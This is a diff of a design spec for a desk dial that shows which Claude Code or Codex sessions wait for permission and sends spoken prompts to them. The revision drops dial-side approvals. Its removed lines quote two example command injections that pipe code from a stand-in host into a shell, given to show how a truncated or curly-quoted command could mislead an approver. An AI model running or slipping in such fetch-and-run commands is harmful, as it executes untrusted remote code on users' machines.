@@ -1,9 +1,37 @@
-# The dial answers and talks to agents outside Harness (Diego, 2026-11-13)
+# The dial shows and talks to agents outside Harness (Diego, 2026-11-13)
 
 Wave 1a of the device integration roadmap, on top of wave 0
 ([the Harness device without the app](2026-11-13-device-without-the-app.md)). Wave 0 lists the agents running
-anywhere on this computer and shows their state; wave 1a lets the dial act on them: approve or deny Claude Code's
-permission prompts, talk to an agent, and tap to open it in Orca.
+anywhere on this computer and shows their state; wave 1a lets the dial show what a Claude Code permission prompt waits
+for, talk to an idle agent, and tap to open it in Orca.
+
+## Changed after the dial check (Diego, 2026-11-14)
+
+On a real round dial (firmware 0.1.0 and wave 0's 0.1.0-dev, Focus-only since #3848) nothing opens a question's
+choices: the face shows the question in the recap's place and a tap there starts voice, by design ("the answer is given
+in the app, so the face grows no buttons", `ui_habitat.c`). So Diego decided, replacing this spec's approvals:
+
+- **The firmware stays as released.** No firmware change in wave 1a.
+- **The dial only shows a permission prompt,** never answers it. The person answers in the app it is in (the terminal,
+  Orca, the Claude app). The plugin's `PermissionRequest` hook only tells the daemon, then decides nothing at once; no
+  path anywhere lets the dial approve a command.
+- **Voice reaches a busy agent too,** as it already does for a Harness agent: the words are delivered and the engine
+  queues them for after its turn. Only an ended session is refused (its terminal may hold a shell by then).
+- **Opening an agent from the dial opens its app and focuses its pane,** with no new permission:
+  - **Every host with a known bundle id** at least comes forward (`open -b <bundle id>` on macOS), Warp, Alacritty,
+    VS Code and Cursor included.
+  - **Focus on the exact pane** where a way needs no permission: Orca (`orca terminal switch`, then Orca forward);
+    the Claude app (`com.anthropic.claudefordesktop`, recognised by `__CFBundleIdentifier`; its session through
+    `claude://code/continue?session=<CLAUDE_CODE_HOST_SESSION_ID>`, the hint joining the allowlist once checked not to
+    be a secret); WezTerm (`wezterm cli activate-pane --pane-id <WEZTERM_PANE>`); herdr (`herdr agent focus
+    <HERDR_PANE_ID>`).
+  - **The Claude app's continue link is undocumented** (read from the app, not published): when it fails or opens
+    nothing, the app still comes forward and the daemon logs one line with no session id. It may change with any app
+    release.
+  - **Not in wave 1a:** Terminal, iTerm2 and Ghostty (AppleScript, a new Automation permission), tmux, Zellij and
+    kitty (an app-side setting or more hints).
+- The sections below that described approving from the dial (the 5-minute wait, the card's Allow and Deny, the
+  `terminalOnly` rules, the approval route and queue) are replaced by "Waiting for permission".
 
 ## Why
 
@@ -14,30 +42,27 @@ to do next.
 ## Decided (Diego, 2026-11-13)
 
 - **Scope.** The Claude Code plugin and the Orca adapter. Codex's own adapter (`codex queue`) and herdr come later.
-- **Approvals from the dial.** Only the exact pending request; never auto-approve; it expires; none while no dial is
-  attached; the first answer, the dial's or the terminal's, wins and the other closes.
+- **The dial shows a waiting permission prompt; it never answers one** (Diego, 2026-11-14; above).
 - **A plugin of its own,** `harness-device`, in this repository's marketplace (`.claude-plugin/marketplace.json`,
-  `plugins/harness-device/`), not inside the `harness` plugin. It holds the approval hook and the mod; one install, one
+  `plugins/harness-device/`), not inside the `harness` plugin. It holds the permission hook and the mod; one install, one
   consent.
 - **Consent and install** happen in the Harness Device menu-bar app (wave 1b, another run). This run gives it the CLI:
   `harness device claude status --json` → `{ supported, installed, enabled, claudeVersion }`,
   `harness device claude enable`, `harness device claude disable`. No menu-bar UI here.
-- **Approvals go through Claude Code's `PermissionRequest` hook, the mod only carries voice** (the spike below).
-- **The hook waits 5 minutes** for the dial; then the dial's card closes and the terminal's own prompt, which has been
-  there all along, carries on alone.
+- **The permission hook only reports; the mod carries voice.**
 - **Orca: actions only** (option A). Harness already sees Claude Code in Orca through its hooks (wave 0); the adapter adds
   voice (`orca terminal send`) and open (`orca terminal switch`) for those agents, found by their Orca terminal handle.
   No polling of Orca.
-- **Voice goes only to an agent that is not working.** A busy agent is refused on the dial; nothing is typed into a
-  running turn. This holds for every route, the mod's and Orca's, and for every engine in an Orca terminal (Codex
-  included).
+- **Voice reaches an agent whether it is idle or working** (Diego, 2026-11-14, replacing "only when not working"): the
+  engine queues words given during a turn, as for a Harness agent. A session that has ended is refused.
 - **Claude Code in a Harness pane keeps today's path:** the pane watcher sees the prompt and the dial keys the answer;
   the hook stands aside for those sessions.
 - **The plugin reaches Harness through its launcher:** `~/.local/bin/harness` first, then `harness` on `PATH`; with
   neither, the hook decides nothing and the mod stays idle.
 - **Platforms:** macOS and Linux. Windows later.
-- **The approval card** reads "Allow Bash?" with one line of what it would do, and two answers, "Allow" and "Deny". No
-  "always allow".
+## Decided, continued
+
+- **The waiting line** names the prompt and the app to answer in: "<summary> · answer in {Host}".
 
 ## The spike (2026-11-13, Claude Code 2.1.323)
 
@@ -62,8 +87,8 @@ A throwaway mod and hook, run in a real interactive session:
 ## Goal
 
 With Claude Code running in Orca, Ghostty or any terminal on this computer and the plugin enabled, a person at the dial
-can allow or deny a waiting permission prompt, say the next prompt to an idle agent, and tap an agent in Orca to bring
-its terminal forward. The terminal stays fully usable: whoever answers first wins.
+sees which agent waits for permission and for what, says the next prompt to an idle agent, and taps an agent in Orca to
+bring its terminal forward. Every prompt is answered in its own app.
 
 ## Design
 
@@ -71,10 +96,10 @@ its terminal forward. The terminal stays fully usable: whoever answers first win
 
 ```
 Claude Code (outside a Harness pane), plugin harness-device enabled
-  ├─ PermissionRequest hook → hooks/approve → `harness device claude approve`   (one per prompt, waits ≤ 5 min)
-  │     POST /api/hook/approval  ── core: check, bound, forward (call) ──▶ devices: Approvals ──▶ the dial's question card
-  │     ◀── allow | deny | none                                            ◀── Allow / Deny on the dial
-  │     (the person answers in the terminal first → Claude Code kills the hook → the request closes → core tells devices)
+  ├─ PermissionRequest hook → hooks/asked → `harness device claude asked`   (fire and forget, decides nothing)
+  │     POST /api/hook/observed { event: "asked", summary } ── core: check, bound, forward ──▶ devices: the agent waits,
+  │     with the line "<summary> · answer in {Host}"; the next hook event of that session (PostToolUse, Stop,
+  │     UserPromptSubmit, SessionEnd) clears it
   └─ mod (hooks/device.js), voice only
         POST /api/hook/inbox (long poll ≤ 25 s) ── core ──▶ devices: Inbox ◀── a transcript for this session
         ◀── { text } → $.prompt.submit({ text, asUser: true })
@@ -88,101 +113,43 @@ Claude Code or Codex in an Orca terminal (hint ORCA_TERMINAL_HANDLE from the wav
 
 - `.claude-plugin/plugin.json`: name `harness-device`; added to `.claude-plugin/marketplace.json` beside `harness`.
 - `hooks/hooks.json`: `modules: ["./device.js"]`, and one `PermissionRequest` command hook for every tool, running
-  `${CLAUDE_PLUGIN_ROOT}/hooks/approve` with a 330 s timeout (the 5-minute wait and a margin).
-- `hooks/approve` (POSIX sh, a few lines): runs `~/.local/bin/harness device claude approve` if it is executable, else
-  `harness device claude approve` if `harness` is on `PATH`, else exits 0 with no output. The launcher reads stdin
+  `"${CLAUDE_PLUGIN_ROOT}/hooks/asked"` with a 5 s timeout.
+- `hooks/asked` (POSIX sh, a few lines): runs `~/.local/bin/harness device claude asked` if it is executable, else
+  `harness device claude asked` if `harness` is on `PATH`, else exits 0 with no output. The launcher reads stdin
   itself; the script passes no environment of its own.
 - `hooks/device.js`, the mod (voice only; below).
-- A README with what it does, what it never does (no auto-approve, no "always allow", nothing leaves the computer), and
-  how to remove it.
+- A README with what it does (the dial shows a waiting prompt and gives an idle agent a spoken prompt), what it never
+  does (answer a prompt, approve anything, send anything off the computer), and how to remove it.
 
-### Approvals
+### Waiting for permission
 
-**The hook's client, `harness device claude approve`** (hidden from `--help`; outside the core):
+**The hook's client, `harness device claude asked`** (hidden from `--help`; CLI only, never in the daemon):
 
-- Reads the hook's stdin JSON, at most 256 KB; anything else is no decision.
-- Never asks the dial for a tool that needs the person anyway (`AskUserQuestion`, `ExitPlanMode`): no decision at once.
+- Reads the hook's stdin JSON, at most 256 KB; anything else is nothing sent.
+- Skips the tools that are the person's anyway (`AskUserQuestion`, `ExitPlanMode`): nothing sent.
 - Builds a summary of one line, at most 200 bytes of UTF-8, cut on a character boundary: Bash → the command's first
-  line; Edit, Write, NotebookEdit, Read → the file path; WebFetch → the URL's host; an MCP tool → its server and tool
-  name; anything else → the tool's name. The rest of `tool_input` stays in the hook. (The round dial takes a question of
-  at most 256 bytes that `ui_can_display` can draw; "Allow <tool>?\n" and the summary fit.)
-- **A card always shows the command** (PM, 2026-11-13). A character the dial cannot draw (CJK, an emoji) would make
-  today's firmware refuse the whole question, so the devices process replaces each such character with `?` when it
-  builds the card, using the round dial's drawable set; the summary line is never dropped.
-- **The dial approves only a command it can show whole** (Diego, 2026-11-14). A Bash command of more than one non-blank
-  line, or whose line is over 200 bytes, would show only part of what Allow approves (`npm test\ncurl evil.sh | sh`
-  would read "npm test"). For such a command the client still posts, marked `terminalOnly`, and the answer is `none` at
-  once: no Allow or Deny on the dial, and the terminal's prompt decides. The dial shows the agent waiting with the line
-  "Answer this one in the terminal." A one-line command that fits is approved on the dial as before.
-- **Only plain ASCII, too** (Diego, 2026-11-14). A Bash command with any character outside printable ASCII (above
-  `0x7E`, or a control character other than the line breaks above) is `terminalOnly` the same way: a curly quote or a
-  no-break space reads as quoting or spacing on the dial while bash takes it as a letter (`echo “; curl x | sh; ”` runs
-  `curl`).
-- **Only the tools whose card shows what they act on** (Diego, 2026-11-14). The dial may approve Bash (by the rules
-  above), Edit, Write and NotebookEdit (the file path), Read (the file path) and WebFetch (the URL's host); a path or host
-  over 200 bytes, with any character outside printable ASCII, or opening or ending with a space, and a host in other
-  letters (punycode, `xn--…`), are `terminalOnly` too. An MCP tool (`mcp__…`) and every other tool are always
-  `terminalOnly`: their card could show only a name, while Allow would approve arguments it never showed.
-- Posts `{ sessionId, tool, summary, cwd }` to `/api/hook/approval` with the CLI's own client for the daemon's local
-  socket (the TypeScript transport under `cli/src/lib/` the other CLI commands use, not `notify.mjs`, which is a
-  standalone script), and waits up to 5 minutes.
-- **Approvals need the Unix socket; without it the original prompt handles it** (PM, 2026-11-14). Over the TCP port
-  nothing proves the answer came from the daemon: another account holding the port while the daemon restarts could
-  answer `allow`. So where no socket path fits (the data folder and home both too long), the client posts nothing,
-  creates no hook token and gives no decision. The daemon logs once, with no command or path, that dial approvals are
-  off because it has no Unix socket, so the person can see why the dial gets none.
-- Prints `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}` for `allow`,
-  the same with `"deny"` and the message "Denied from the Harness device." for `deny`, and nothing for `none`. Always
-  exits 0: any error, a daemon that is not running, or a timeout is no decision, and the terminal's prompt decides.
+  non-blank line, with " …" when there is more; Edit, Write, NotebookEdit, Read → the file path; WebFetch → the URL's
+  host; an MCP tool → its server and tool name; anything else → the tool's name. The rest of `tool_input` stays in the
+  hook.
+- Posts `{ engine: "claude", sessionId, event: "asked", tool, summary, cwd }` to `/api/hook/observed` over the daemon's
+  Unix socket only (no socket, nothing sent), fire and forget: it waits only until the request is written, 1 s at most.
+- **Prints nothing and exits 0, always.** It reads no answer from the daemon, so nothing the daemon or anyone else sends
+  can become a decision; the prompt is the app's.
 - Sends no environment variable: Orca's `ORCA_PAIRING_CODE` and `ORCA_AGENT_SESSION_SPAWN_TOKEN` sit in the same
   environment and must never leave the hook.
 
-**The core routes.** `/api/hook/approval` and `/api/hook/inbox` sit in `hookServer.ts` beside `/api/hook/observed`, with
-the same authentication (`hookOk`). Their checks and forwarding live in one new core file, `core/deviceHookCalls.ts`,
-listed in `src/architecture.coreFiles.txt` with its reason (hook calls are what the core already receives; it only
-forwards them, typed and bounded, to the one component that faces the dial). The devices port gains the matching members
-in `core/api.ts`, with fallbacks in `DEVICES_FALLBACKS` (`none` for an approval, `{ off: true }` for a poll), so the devices-in-core path works too.
+**The core.** `/api/hook/observed` (wave 0's route, `core/observedHook.ts`) gains the event `asked` with two optional
+fields, `tool` ≤ 64 characters and `summary` ≤ 200 bytes, checked and bounded like the others and forwarded as an
+observed event. The core keeps nothing. There is no approval route, no held request and no answer path.
 
-- **Never starts the devices process.** A call to a service that has never run starts it (`serviceLinks.ts`), so both
-  routes first check that the devices process is connected and a dial is watching (`devicesLink`'s watching state);
-  otherwise they answer at once: `none` for an approval, 503 for a poll (no device), so the mod can tell it from a
-  hold that ran out.
+**In the devices process.** An `asked` event makes the observed agent `needs-you` with the activity line
+"<summary> · answer in {Host}" (the host's display name: Orca, Ghostty, Terminal, …), through the same activity path as
+wave 0's "Waiting for you · {Host}", which it replaces for that session, so the two never show as two lines or flicker.
+The next hook event of that session (PostToolUse, Stop, UserPromptSubmit, SessionEnd) clears it. A character the round
+dial cannot draw becomes `?`. The summary goes only to the dial over its cable: never to the backend, the phone, the
+router or a log line.
 
-`/api/hook/approval`:
-
-- Accepts `sessionId` ≤ 128 characters, `tool` ≤ 64, `summary` ≤ 200 bytes, `cwd` ≤ 1024, body ≤ 4 KB; else 400.
-- At most 4 open approvals per session and 16 in all; more get `none` at once.
-- Gives the request an id and forwards it to the devices process as a call with a 5-minute deadline, then answers its
-  `allow`, `deny` or `none`; a call that fails or times out is `none`.
-- When the client goes before the answer (`res` closes while not yet written: the person answered in the terminal, so
-  Claude Code killed the hook), sends the notice `approval.gone { id }`; the devices process then closes the card and
-  answers the pending call `none`, which the core drops. (A service call cannot be cancelled from the core.)
-- The core keeps only the open requests themselves; it parses nothing beyond the typed fields.
-
-**Approvals in the devices process** (`cli/src/cable/hosts/approvals.ts`):
-
-- No dial connected, or the dial is in a window's tab view (below): `none` at once.
-- A session Harness owns (a Harness agent with that session id): `none` at once; the pane path answers it.
-- Otherwise the observed agent for `claude` + `sessionId` (created if the hook came first) turns `needs-you`, gains the
-  `a` cap while an approval is open, and the dial gets the existing `question` frame: `id: "approval:<uuid>"`, the
-  agent's name from the registry (`describe()` falls back to it when the fleet does not know the agent), one question
-  `{ key: "approval", q: "Allow Bash?\n<summary>", options: ["Allow", "Deny"], multi: false }` with no `canText`, so the
-  round dial shows no `[say]` on it.
-- **One card per agent at a time.** The dial and `QuestionInbox` hold one question per agent, so further approvals for
-  the same agent (parallel tool calls) wait in order in `Approvals`, and the next card goes out when the current one
-  closes. A waiting approval that `approval.gone` removes never shows.
-- **An answer counts only for the exact open request.** `CableHost.answer` and `CableHost.answerReviewed` catch a request
-  id that starts with `approval:` before the fleet sees it (the reviewed path carries it in `ReviewedAnswer.requestId`).
-  It must be that agent's open card; any other is refused with "This request is closed." `Allow` → `allow`, `Deny` →
-  `deny`.
-- **The first answer wins.** The dial's answer resolves the call and sends `question.close`. `approval.gone` (the
-  terminal answered) sends `question.close` and answers the call `none`. After 5 minutes, or when the dial disconnects
-  or a window opens, the answer is `none` and the card closes; the agent stays `needs-you` (the terminal's prompt still
-  waits) until its next hook event.
-- A spoken answer to an approval is refused: "Tap Allow or Deny."
-
-**With a window open nothing changes,** as in wave 0: the dial holds the active tab, which has no observed agents, so
-approvals get `none` and observed agents take no voice. The terminal's prompt decides.
+**With a window open nothing changes,** as in wave 0: the dial holds the active tab, which has no observed agents.
 
 ### Voice
 
@@ -197,7 +164,10 @@ handed out), then keeps one long poll open from a timer:
   60 s. A route this daemon does not know (an older Harness): try again in 10 minutes.
 - It registers no tool, command, interface or `classic.*` hook, and touches no settings.
 
-**The core route `/api/hook/inbox`:** `sessionId` ≤ 128, body ≤ 1 KB, one open poll per session (a newer one replaces
+**The core route `/api/hook/inbox`** (in `hookServer.ts` beside `/api/hook/observed`, with the same authentication
+(`hookOk`); its checks and forwarding live in `core/deviceHookCalls.ts`, listed in `src/architecture.coreFiles.txt`;
+it first checks that the devices process is connected and a dial is watching, and otherwise answers 503 at once, so
+it never starts the devices process): `sessionId` ≤ 128, body ≤ 1 KB, one open poll per session (a newer one replaces
 it); each poll gets an id and goes to the devices process as a call with a 25 s deadline. When the client goes first, or
 a newer poll replaces it, the core sends `inbox.gone { pollId }`, so the devices process always knows which polls are
 open.
@@ -205,8 +175,9 @@ open.
 **In the devices process.** An observed agent can take voice (`v`) when its session has a poll open, or one closed under
 35 s ago (the mod opens the next at once), or when it has an Orca terminal handle. A transcript for it goes:
 
-1. Refused when the agent is `working` or `needs-you`: `voice.error` "<name> is busy. Say it when it is done." Nothing is
-   queued or typed.
+1. Refused only when the session has ended ("<name> did not answer."). Idle, working or waiting, the words go on: the
+   mod's `$.prompt.submit` waits for the turn to end before it starts the next, and Claude Code and Codex queue what is
+   typed into their running TUI.
 2. To the mod when its session has a poll open, or opens one within 5 s: the text is the answer to that poll, and that is
    "sent" (the mod sends no acknowledgement). No poll in 5 s: "<name> did not answer."
 3. Else to Orca (`orca terminal send … --enter --wait-submit 5`).
@@ -224,12 +195,12 @@ dial shows the existing `voice.transcript` or `voice.error`.
   no hint is cut when every one is set and the core takes no more than an honest hook can send.
 - **Per agent.** `ObservedSource` reads the hints on every event, not only when it first creates the agent, and keeps the
   handle when it matches `^term_[0-9a-f-]{36}$`. Its `capabilities(agent)` becomes per agent: `s` always, `v` and `f` as
-  this section and Voice say, `a` while an approval is open.
+  this section and Voice say.
 - **Open (`f`).** An agent with a handle has `f`. A tap (`agent.open` with no `reason`) runs `orca terminal switch
   --terminal <h> --json`, then on macOS `open -b com.stablyai.orca` so Orca comes forward. An `agent.open` with
   `reason: "question"` (a question screen that came up by itself) never switches Orca. A failure is a toast: "Orca did
   not open it."
-- **Voice.** `orca terminal send --terminal <h> --text <t> --enter --wait-submit 5 --json`, under the busy rule above.
+- **Voice.** `orca terminal send --terminal <h> --text <t> --enter --wait-submit 5 --json`, under the rule above (an ended session is refused).
 - **The command.** `orca` on `PATH`, else `/Applications/Orca.app/Contents/Resources/bin/orca` on macOS. Run with
   `execFile` (no shell), 10 s timeout, text ≤ 2000 characters, at most one Orca command at a time per agent.
 - Orca chat sessions have no terminal handle: they take voice only through the mod, and no open.
@@ -251,81 +222,71 @@ In the `harness` CLI (`cli/src/cli.ts`, a new `device` command), never in the co
 
 ### The wire and the firmware
 
-No new frame and no new field: approvals use `question`, `answer` / `answer.reviewed`, `question.close` and the `caps`
-letters from wave 0. The round firmware already gates answering on `a`, voice on `v` and open on `f`, and shows `[say]`
-on a question only with `canText`. No firmware change: a host test (`test_question_ui.py`) shows an approval card with
-the longest summary renders, with no `[say]`. Harness Pro is not part of wave 1a.
+No new frame and no new field beyond wave 0's: the waiting line is wave 0's activity line, and `caps` stays `s`, `v`,
+`f` for an agent outside Harness (never `a`). No firmware change. Harness Pro is not part of wave 1a.
 
 ## Out of scope
 
-Codex's adapter, herdr, cmux and the terminals' own adapters; polling Orca or listing agents from it; "always allow";
-approvals for engines other than Claude Code; answering `AskUserQuestion` from the dial; the menu-bar app (wave 1b);
+Codex's adapter, herdr, cmux and the terminals' own adapters; polling Orca or listing agents from it; answering any
+prompt or question from the dial; the menu-bar app (wave 1b);
 Windows.
 
 ## Done when
 
 **Tests**
 
-- `harness device claude approve`: the summary per tool; no decision for `AskUserQuestion` and `ExitPlanMode`; the
-  output for each answer; exit 0 on every failure; the posted body never carries `ORCA_PAIRING_CODE`,
-  `ORCA_AGENT_SESSION_SPAWN_TOKEN` or any other environment variable (set them in the test and look at the body).
+- `harness device claude asked`: the summary per tool; nothing sent for `AskUserQuestion` and `ExitPlanMode`; prints
+  nothing and exits 0 whatever the daemon answers, `{"decision":"allow"}` included; nothing sent with no socket; the
+  posted body never carries `ORCA_PAIRING_CODE`, `ORCA_AGENT_SESSION_SPAWN_TOKEN` or any other environment variable.
 - `notify.mjs`: `ORCA_TERMINAL_HANDLE` is posted; `ORCA_PAIRING_CODE` and `ORCA_AGENT_SESSION_SPAWN_TOKEN` are never
   posted, with both set; all 9 allowlisted hints set at once reach the devices uncut; the core takes 9 and refuses 10.
-- Core routes: bounds, the open-request caps, `none` or a 503 at once when the devices process is not connected
-  or no dial watches (and the process is not started), `approval.gone` when the client goes first, `inbox.gone` when it
-  goes or a newer poll replaces it, the fallbacks; 100% per file (`npm run test:core`).
-- Approvals: no dial or a window's tab view → `none`; a Harness-owned session → `none`; the card's frame with the
-  agent's name and no `canText`; one card per agent, the next after it closes; only the exact id is accepted, through
-  both answer paths, and a stale or other id is refused; the first answer wins and the card closes; `approval.gone`
-  closes it or drops a waiting one; expiry, dial disconnect and a window opening give `none`; a spoken answer is refused.
-- Voice: refused while working or needs-you; the mod route when a poll is open or opens within 5 s; the Orca route
-  otherwise; `sendTurn` reaches `source.send` for an agent outside Harness; `v`, `f` and `a` per agent, following the
-  poll, the handle (read on every event) and the open approval.
+- Core: `asked` with its bounded `tool` and `summary`; the inbox route's bounds, 503 at once with no device (the
+  process is not started), `inbox.gone`, the fallbacks; 100% per file (`npm run test:core`).
+- Waiting: `asked` gives the agent `needs-you` and "<summary> · answer in {Host}" in place of wave 0's line; the next
+  event of that session clears it, another session's does not; no `question` frame is sent and no `answer` or
+  `answer.reviewed` frame can approve anything; the summary reaches no backend request, router candidate or log line.
+- Voice: delivered to a working agent (not refused); refused once the session ended; the mod route when a poll is open or opens within 5 s; the Orca route
+  otherwise; `sendTurn` reaches `source.send` for an agent outside Harness; `v` and `f` per agent, following the poll
+  and the handle (read on every event).
 - Orca actions against a fake `orca`: the arguments, no shell, the timeout, the handle check, the toast on failure; a
   question screen's `agent.open` never switches Orca.
-- Round firmware host test: an approval card with the longest summary renders, with no `[say]`.
-- A summary with CJK or an emoji reaches the dial with `?` in place of each character it cannot draw, and the card renders
-  with its command line.
 - The CLI's status, enable and disable against a fake `claude`, enable twice.
 - The plugin: `claude plugin validate plugins/harness-device` passes; `claude plugin test` for the mod (a delivered text is
-  submitted as the user; no daemon → retry later); `hooks/approve` with no launcher exits 0 with no output.
-- End to end: the real daemon, a fake dial, and the real `harness device claude approve` fed a `PermissionRequest`
-  input: the dial gets the card; Allow prints the allow decision; killing the client closes the card; no dial → no
-  decision at once.
+  submitted as the user; no daemon → retry later); `hooks/asked` with no launcher exits 0 with no output.
+- End to end: the real daemon, a fake dial, and the real `harness device claude asked` fed a `PermissionRequest` input:
+  the client exits at once with no output; the dial gets the waiting line; a later Stop clears it; no dial → nothing.
 
 **On a dial** (Diego's Mac and his real Claude Code, after wave 0 merges; the CLI from this branch with
 `make install-cli`, the plugin enabled with `harness device claude enable`; afterwards the release CLI is put back,
 `harness device claude disable` runs and the folder marketplace is removed. The dial is asked for from the orchestrator
 first. The voice checks 4-6 run against a daemon on the staging env file (`HARNESS_ENV_FILE`), never production.)
 
-1. Claude Code in an Orca terminal asks to run a command: the dial shows "Allow Bash?"; Allow runs it and the terminal's
-   prompt closes. Deny refuses it.
-2. The same, answered in the terminal: the dial's card closes.
-3. Auto mode: a command the classifier allows never reaches the dial.
-4. An idle Claude Code in Ghostty: a spoken prompt starts a turn. A working one: the dial says it is busy.
+1. Claude Code in an Orca terminal asks to run a command: the dial shows the agent waiting, with "<command> · answer in
+   Orca". Answered in Orca (or the terminal), the line goes.
+2. Auto mode: a command the classifier allows never reaches the dial.
+3. `harness device claude disable`: the next prompt never reaches the dial.
+4. An idle Claude Code in Ghostty: a spoken prompt starts a turn. Said while it works, the words are taken and queued for
+   after its turn.
 5. Codex in an Orca terminal, idle: a spoken prompt starts a turn.
 6. Claude Code in an Orca chat: a spoken prompt starts a turn (through the mod).
-7. A tap on an Orca agent brings its terminal forward in Orca.
+7. A tap on an Orca agent brings its terminal forward in Orca. A Claude Code in the Claude app, opened from the dial,
+   brings the Claude app forward on that session.
 8. `harness device claude disable`: the next prompt never reaches the dial.
 
 ## Design notes
 
-- **Data.** Nothing is written to disk. The devices process holds each open approval (session id, tool name, the
-  200-character summary) until it is answered, gone or expired, at most 16; and a transcript only until the mod takes it
-  (5 s). The summary goes to the dial over its cable, never to the backend, the phone or another machine. Logs carry no
+- **Data.** Nothing is written to disk. The devices process holds a waiting agent's summary (200 bytes) until that
+  session's next hook event, and a transcript only until the mod takes it (5 s). The summary goes to the dial over its cable, never to the backend, the phone or another machine. Logs carry no
   summary, command, path or transcript: counts and outcomes only.
-- **Measures** (daemon log lines, as the dial's notify tally). Approvals shown, allowed, denied, expired and answered in the terminal, with the time to a dial answer;
+- **Measures** (daemon log lines, as the dial's notify tally). Waiting prompts shown and cleared;
   voice sends by route (mod, Orca) and refusals by reason. No content and no identifiers.
-- **Cost.** With no dial, the hook's client gets `none` at once and the mod polls once a minute per Claude Code session.
-  With a dial, one held request per session (25 s) and one `harness` process per open approval. Nothing polls Orca.
-- **Failure.** Every path falls back to the terminal: an error, a crash or a timeout is no decision, and the terminal's
-  prompt is always there. A command that arrives twice (two answers to one card) resolves once: the first wins.
-- **Security.** Only the exact open request is approved, never by rule or pattern; Claude Code's deny and ask rules and
-  auto mode's classifier stand (the hook runs after them). The core takes typed, bounded fields; the tool input is cut to
-  a summary outside the core. The hook's client reaches the daemon over its local, credential-checked transport, and the
+- **Cost.** One short `harness` process per permission prompt (it exits once its post is written). With no dial the mod
+  polls once a minute per Claude Code session; with a dial, one held poll per session (25 s). Nothing polls Orca.
+- **Failure.** The hook never decides, so any error leaves the prompt to its app, as it would be with no plugin.
+- **Security.** Nothing approves a command: the hook's client prints no decision and reads no answer, and no dial frame
+  maps to one. The core takes typed, bounded fields; the tool input is cut to a summary outside the core. The hook's client reaches the daemon over its local, credential-checked transport, and the
   mod over the Unix socket only the person can open; `link` prints the socket path and no credential.
   Orca's secret variables never leave the hook.
-- **Compatibility.** The plugin may be newer than the daemon: an unknown route means no decision and an idle mod. An older
-  firmware shows the approval as any question.
+- **Compatibility.** The plugin may be newer than the daemon: an unknown event or route means nothing shown and an idle mod.
 - **Platforms.** macOS and Linux; the end-to-end and the dial checks run on macOS. On Windows `status` says
   `supported: false` and `enable` refuses.
